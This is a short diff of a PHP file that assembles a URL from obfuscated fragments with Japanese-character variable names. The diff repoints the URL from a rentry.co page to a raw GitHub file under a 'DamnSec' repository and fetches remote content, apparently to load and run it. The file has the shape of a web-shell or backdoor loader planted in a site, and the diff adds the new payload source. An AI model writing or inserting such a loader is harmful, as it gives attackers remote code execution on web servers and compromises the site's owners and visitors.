@@ -1,12 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
 <?php
 $u = "htt"; 
 $d = "ps://"; 
-$a = "rentry.co"; 
+$a = "raw.githubusercontent.com"; 
 $デ = "/"; 
-$の = "aboutphp"; 
-$ur = "/raw"; 
+$の = "DamnSec/x/refs/heads/main/"; 
+$ur = "1.txt"; 
 $url = $u . $d . $a . $デ . $の . $ur; // URL data
 function t($u) {
     if (ini_get('allow_url_fopen')) {
@@ -49,4 +47,3 @@ if ($content !== false) {
     echo "エラー。";
 }
 ?>
-</html>
